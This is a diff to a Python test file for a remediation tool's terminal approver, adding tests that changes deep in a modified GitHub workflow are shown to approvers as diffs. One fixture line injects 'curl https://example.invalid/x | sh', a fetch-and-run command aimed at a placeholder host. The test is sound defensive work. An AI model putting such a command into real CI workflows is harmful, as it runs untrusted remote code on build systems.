@@ -22,7 +22,7 @@ from darnit.config.framework_schema import (
 )
 from darnit.config.operator.schema import RemediationSettings
 from darnit.core.utils import RecordedGhApi, set_gh_api_responder
-from darnit.remediation.plan import FileChange, PlanItem
+from darnit.remediation.plan import FileChange, PlanItem, content_digest
 from darnit.remediation.platform import PlatformRequirement, ResolvedPolicy, plan
 from darnit.remediation.platform.policy import TerminalApprover, terminal_approver
 from tests.darnit.remediation.platform.conftest import PLATFORM_FIXTURES, REPO_PATH, SimulatedGitHub
@@ -249,7 +249,7 @@ class TestTerminalApproverForPlanItems:
         assert item.digest in shown
         assert "T-UNSAFE" in shown and "exec[0]" in shown
         assert "create UNSAFE.md" in shown
-        assert "line 0" in shown and "line 29" not in shown, "the content is summarized"
+        assert "line 0" in shown and "line 29" in shown, "a created file is shown in full"
         assert "SECURITY.md" in shown and "already_exists" in shown
         assert "zizmor --fix=all $PATH" in shown
         assert "it cannot be previewed exactly" in shown
@@ -269,6 +269,56 @@ class TestTerminalApproverForPlanItems:
 
         assert "\x1b" not in out.getvalue()
         assert out.getvalue().isascii()
+
+    @staticmethod
+    def _workflow(injected: str | None = None) -> str:
+        lines = [f"      - run: echo step {i}" for i in range(80)]
+        if injected is not None:
+            lines[63] = injected
+        return "\n".join(lines) + "\n"
+
+    def _modify_item(self) -> tuple[PlanItem, str]:
+        injected = "      - run: curl https://example.invalid/x | sh"
+        item = PlanItem(
+            control_id="T-WF",
+            step="yaml_inject[0]",
+            file_changes=[
+                FileChange(
+                    path=".github/workflows/ci.yml",
+                    action="modify",
+                    content=self._workflow(injected),
+                    before_digest=content_digest(self._workflow()),
+                )
+            ],
+            previewable=True,
+            requires_individual_approval=True,
+        )
+        return item, injected
+
+    def test_a_change_deep_in_a_modified_file_is_shown_as_a_diff(self, tmp_path: Path) -> None:
+        item, injected = self._modify_item()
+        workflow = tmp_path / ".github" / "workflows" / "ci.yml"
+        workflow.parent.mkdir(parents=True)
+        workflow.write_text(self._workflow(), encoding="utf-8")
+        out = io.StringIO()
+
+        TerminalApprover(io.StringIO("n\n"), out, root=tmp_path).approve_item(item, ["safe = false"])
+
+        shown = out.getvalue()
+        assert f"+{injected}" in shown
+        assert "-      - run: echo step 63" in shown
+        assert "echo step 10\n" not in shown, "a diff, not the whole file"
+        assert shown.isascii()
+
+    def test_a_modified_file_whose_current_content_cannot_be_read_is_shown_in_full(self, tmp_path: Path) -> None:
+        item, injected = self._modify_item()
+        out = io.StringIO()
+
+        TerminalApprover(io.StringIO("n\n"), out, root=tmp_path).approve_item(item, ["safe = false"])
+
+        shown = out.getvalue()
+        assert injected in shown
+        assert "echo step 79" in shown
 
     def test_eof_is_a_refusal(self) -> None:
         assert TerminalApprover(io.StringIO(""), io.StringIO()).approve_item(self._item(), []) is False
